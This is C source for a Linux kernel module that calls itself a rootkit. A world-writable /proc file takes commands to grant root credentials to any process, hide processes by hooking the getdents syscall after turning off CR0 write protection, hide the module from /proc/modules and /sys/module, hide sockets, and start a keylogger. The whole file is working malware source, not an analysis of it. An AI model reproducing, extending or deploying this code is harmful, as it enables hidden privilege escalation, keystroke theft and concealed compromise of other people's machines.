#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/types.h>
#include <asm/uaccess.h>
#include <asm/cacheflush.h>
#include <asm/unistd.h>
#include <linux/highmem.h>
#include <asm/current.h>
#include <linux/sched.h>
#include <linux/slab.h>
#include <linux/list.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include <linux/fdtable.h>
#include <linux/delay.h>
#include <linux/proc_fs.h>
#include <linux/namei.h>
#include <linux/version.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>
#include <asm/uaccess.h>
#include "keyLogger.c"

/* proc file configuration specifics */
#define PROCFS_MAX_SIZE 1024
#define PROCFS_NAME "buffer1k"

#define MODULE_NAME "rootkit"
#define CR0_WP 0x00010000

/* This structure holds information about the /proc file */
static struct proc_dir_entry *Our_Proc_File;

/* Buffer Configurations */
static char procfs_buffer[PROCFS_MAX_SIZE];
static char buff1[PROCFS_MAX_SIZE];
static char buff2[PROCFS_MAX_SIZE];
static unsigned long procfs_buffer_size = 0;

/* Commands */
#define ROOT_CMD 	"root"
#define UNROOT_CMD 	"unroot"
#define HIDE_MOD_CMD 	"hide_mod"
#define SHOW_MOD_CMD 	"show_mod"
#define HIDE_PROC_CMD 	"hide_proc"
#define SHOW_PROC_CMD 	"show_proc"
#define START_KEYLOG_CMD "start_keylog"
#define END_KEYLOG_CMD	"end_keylog"
#define HIDE_SOCK_CMD	"hide_sock"
#define SHOW_SOCK_CMD	"show_sock"


/* Originals */
struct task_struct orig;
struct list_head *prev_mod;

/* Process to manipulate */
long proc_pid;
long root_pid;

void **syscall_table;
unsigned long **find_sys_call_table(void);
asmlinkage int (*orig_getdents)(unsigned int, struct linux_dirent *, unsigned int);

struct linux_dirent {
	unsigned long d_ino;
	unsigned long d_off;
	unsigned short d_reclen;
	char d_name[256];
	char pad;
	char d_type;
};

unsigned long **find_sys_call_table() 
{

	unsigned long ptr;
    	unsigned long *p;

	for (ptr = (unsigned long)sys_close; ptr < (unsigned long)&loops_per_jiffy; ptr += sizeof(void *)) 
	{
		p = (unsigned long *)ptr;

		if (p[__NR_close] == (unsigned long)sys_close) 
		{
			printk(KERN_DEBUG "Found the sys_call_table!!!\n");
			return (unsigned long **)p;
        	}
    	}
    return NULL;
}

/************************************************ STRING MANIPULATION ************************************************/

/* Convert string to integer. Courtesy of the adore-ng rootkit */
long adore_atoi(const char *str)
{
	long ret = 0, mul = 1;
	const char *ptr;
	
	for(ptr = str; *ptr >= '0' && *ptr <= '9'; ptr++);
	
	ptr--;

	while(ptr >= str) {
		if(*ptr < '0' || *ptr > '9')
			break;

		ret += (*ptr - '0') * mul;
		mul *= 10;
		ptr--;	
	}
	return ret;
}

/* Split the input command into two string which can then 
 * be used to figure out the corresponding function */
void split_buffer(void)
{	
	int i;
	int j;
	bool cont = true;
	
	for(i = 0; i < PROCFS_MAX_SIZE; i++)
	{
		if(procfs_buffer[i] == ' ' || procfs_buffer[i] == '\n')
		{
			buff1[i] = '\0';
			i++;

			if(procfs_buffer[i] == '\n')
			{
				cont = false;
			}

			break;
		}

		buff1[i] = procfs_buffer[i];
	}

	if(!cont)
		return;
	
	for(j = 0; j < PROCFS_MAX_SIZE && i < PROCFS_MAX_SIZE; i++, j++)
	{
		if(procfs_buffer[i] == '\n')
		{	
			buff2[i] = '\0';
			break;
		}

		buff2[j] = procfs_buffer[i];
	}
}


/************************************************ ROOT PERMISSIONS ************************************************/

/* Given a process pid, returns the corresponding process's task struct */
struct task_struct *get_task_struct_by_pid(unsigned pid)
{
	struct pid *proc_pid = find_vpid(pid);
	struct task_struct *task;

	if(!proc_pid)
		return 0;

	task = pid_task(proc_pid, PIDTYPE_PID);
	return task;
}

/* Causes the process with the supplied pid to be promoted to root */
void make_root(void)
{	
	struct task_struct *task;
	struct task_struct *init_task;	
	
	orig = *(get_task_struct_by_pid(root_pid));
	task = get_task_struct_by_pid(root_pid);
	init_task = get_task_struct_by_pid(1);
	
	if(!task || !init_task)
		return;

	task->cred = init_task->cred;
}

/* Demote the process corresponding to the supplied pid */
void unroot(void)
{
	struct task_struct *task = get_task_struct_by_pid(root_pid);
	task->cred = orig.cred;
}

/************************************************ HIJACKING getdents ************************************************/

asmlinkage int hacked_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
{
	int result, bp; // bp = position in bytes in kdirp
	char *kdirp; // char buffer so we can do pointer arithmetic by byte
	struct linux_dirent *d;

	struct files_struct *current_files;
	struct fdtable *files_table;
	struct path file_path;
	char pbuf[256], *pathname = NULL;
	long pid = 0;

	// run real getdents
	result = (*orig_getdents)(fd,dirp,count);
	if (result <= 0)
		return result;
	
	// get pathname
	current_files = current->files;
	files_table = files_fdtable(current_files);

	file_path = files_table->fd[fd]->f_path;
	pathname = d_path(&file_path,pbuf,256 * sizeof(char));

	// copy from user to kernelspace;
	if (!access_ok(VERIFY_READ,dirp,result))
		return EFAULT;
	if ((kdirp = kmalloc(result,GFP_KERNEL)) == NULL)
		return EINVAL;
	if (copy_from_user(kdirp,dirp,result))
		return EFAULT;

	// check dirp for files to hide
	for (bp = 0; bp < result; bp += d->d_reclen) {
		d = (struct linux_dirent *) (kdirp + bp);
		// process hiding
		if (!strcmp(pathname,"/proc")) { /* if the sys_getdents is executed in /proc */
			pid = adore_atoi(d->d_name); /* Convert string into long */
			if (pid == proc_pid) {
				/* If the pid of the process matches target,
				   shift the memory by the length of the record
				   to remove any trace for the target process */
				memmove(kdirp + bp,kdirp + bp + d->d_reclen,
				result - bp - d->d_reclen);
				result -= d->d_reclen;
				bp -= d->d_reclen;
			}
		}
	}

	// copy from kernel to userspace
	if (!access_ok(VERIFY_WRITE,dirp,result))
		return EFAULT;
	if (copy_to_user(dirp,kdirp,result))
		return EFAULT;
	kfree(kdirp);

	// return number of bytes read
	return result;
}

void hack_getdents(void)
{
	orig_getdents = syscall_table[__NR_getdents];
	syscall_table[__NR_getdents] = hacked_getdents;
}


void restore_getdents(void)
{
	syscall_table[__NR_getdents] = orig_getdents;
}

/************************************************ MOD VISIBILITY ************************************************/
void hide_mod(void)
{
	prev_mod = THIS_MODULE->list.prev;
	/* Remove the module from /proc/modules */
	list_del_init(&__this_module.list);
	
	/* Remove the module from /sys/module */
	kobject_del(&THIS_MODULE->mkobj.kobj);
}

void show_mod(void)
{
	/* Add the module to /proc/modules */
	list_add(&THIS_MODULE->list, prev_mod);
	
	/* Add the module to /sys/module */
	kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, THIS_MODULE->name);
}

/************************************************ PROC FILE FUNCS ************************************************/

/* This function is called when the /proc file is read */
int procfile_read(char *buffer, char **buffer_location, off_t offset, int buffer_length, int *eof, void *data)
{
	printk(KERN_DEBUG "file cannot be read\n");
	return 0;
}

/* This function is called when the /proc file is written and handles the commands sent by the attacker */
int procfile_write(struct file *file, const char *buffer, unsigned long count, void *data)
{
	printk(KERN_DEBUG "/proc file begin write\n");
	
	/* Get buffer size */
	procfs_buffer_size = count;
	if(procfs_buffer_size > PROCFS_MAX_SIZE) 
	{
		procfs_buffer_size = PROCFS_MAX_SIZE;
	}
	
	if(copy_from_user(procfs_buffer, buffer, procfs_buffer_size))
	{
		return -EFAULT;
	}
	
	split_buffer();

	printk(KERN_DEBUG "Done Splitting\n");
	
	
	if(strncmp(ROOT_CMD, buff1, 4) == 0)
	{
		root_pid = adore_atoi(buff2);
		make_root();
		return procfs_buffer_size;
	}

	else if(strncmp(UNROOT_CMD, buff1, 6) == 0)
	{
		root_pid = adore_atoi(buff2);
		unroot();
		return procfs_buffer_size;
	}

	else if(strncmp(HIDE_MOD_CMD, buff1, 8) == 0)
	{
		hide_mod();
		return procfs_buffer_size;
	}

	else if(strncmp(SHOW_MOD_CMD, buff1, 8) == 0)
	{
		show_mod();
		return procfs_buffer_size;
	}

	else if (strncmp(HIDE_PROC_CMD, buff1, 9) == 0)
	{
		proc_pid = adore_atoi(buff2);
		hack_getdents();
		return procfs_buffer_size;
	}

	else if (strncmp(SHOW_PROC_CMD, buff1, 9) == 0)
	{
		proc_pid = adore_atoi(buff2);
		restore_getdents();
		return procfs_buffer_size;
	}

	else if (strncmp(START_KEYLOG_CMD, buff1, 12) == 0)
	{
		keyLoggerInit();
		return procfs_buffer_size;
	}

	else if (strncmp(END_KEYLOG_CMD, buff1, 10) == 0)
	{
		keyLoggerRrelease();
		return procfs_buffer_size;
	}

	else if (strncmp(HIDE_SOCK_CMD, buff1, 9) == 0)
	{
		start_socket_hiding();
		return procfs_buffer_size;
	}

	else if (strncmp(SHOW_SOCK_CMD, buff1, 9) == 0)
	{
		end_socket_hiding();
		return procfs_buffer_size;
	}

	return procfs_buffer_size;
}

/************************************************ INITIATOR AND TERMINATOR ************************************************/

/* the __init macro is used to describe the function as only being required during initialization time. Once initialization has been performed, the kernel will remove this function and release the corresponding memory */
static int __init init(void)
{
	/* Register cr0 is a control register in the intel architecture that contains a flag
	   called WP on bit 16, which when set, any memory page that is set to read-only 
	   cannot be set to writable */
	int ret;
	unsigned long cr0;
	unsigned long addr;

	syscall_table = (void **)find_sys_call_table();

	if(!syscall_table)
	{
		printk(KERN_DEBUG "Cannot find the syscall_table!\n");
		return -1;
	}
	
	/* Clear the bit 16 on cr0 register */
	cr0 = read_cr0();
	write_cr0(cr0 & ~CR0_WP);
	
	/* Set the memory page containing the syscall_table to writable */
	addr = (unsigned long)syscall_table;
	ret = set_memory_rw(PAGE_ALIGN(addr) - PAGE_SIZE, 3);

	if(ret)
	{
		printk(KERN_DEBUG "Cannot set the memory to rw (%d) at addr %16lx\n", ret,
		PAGE_ALIGN(addr) - PAGE_SIZE);
	}

	else
	{
		printk(KERN_DEBUG "3 pages set to rw\n");
	}

	/* Create the /proc file */
	Our_Proc_File = create_proc_entry(PROCFS_NAME, 0666, NULL);

	if(Our_Proc_File == NULL)
	{
		remove_proc_entry(PROCFS_NAME, NULL);
		printk(KERN_ALERT "Error: Could not initialize /proc/%s\n", PROCFS_NAME);

		return -ENOMEM;
	}

	Our_Proc_File->read_proc = procfile_read;
	Our_Proc_File->write_proc = procfile_write;
	//Our_Proc_File->mode = S_IFREG | S_IRUGO;
	Our_Proc_File->uid = 0;
	Our_Proc_File->gid = 0;

	printk(KERN_DEBUG "/proc file created !\n");	

	printk("rootkit initialized");
	return 0;
}

static void exit(void)
{		

	/* Remove Proc File */
	remove_proc_entry(PROCFS_NAME, NULL);
	unroot();
	restore_getdents();
	printk("rootkit removed");
}

module_init(init);
module_exit(exit);

MODULE_LICENSE("GPL");
